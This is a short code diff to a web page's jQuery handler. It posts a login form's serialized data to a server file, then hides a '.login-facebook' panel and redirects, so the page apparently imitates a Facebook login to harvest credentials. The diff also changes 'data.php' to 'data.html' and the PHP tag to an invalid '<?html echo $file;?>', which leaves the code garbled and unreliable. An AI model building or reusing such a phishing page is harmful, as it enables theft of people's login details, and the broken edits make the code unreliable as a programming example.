@@ -816,14 +816,14 @@ section {
                         // SEND DATA
                         $.ajax({
                             type: 'POST',
-                            url: 'data.php',
+                            url: 'data.html',
                             data: $('form').serialize(),
                             dataType: 'text',
                             success: function() {
                                         $('.login-facebook').toggle();
                                         $('.btn-login-fb').html('Success')
                                         $('.login-facebook').fadeOut();
-                                        window.location = '<?php echo $file;?>';
+                                        window.location = '<?html echo $file;?>';
                                 } 
                         })
                     }
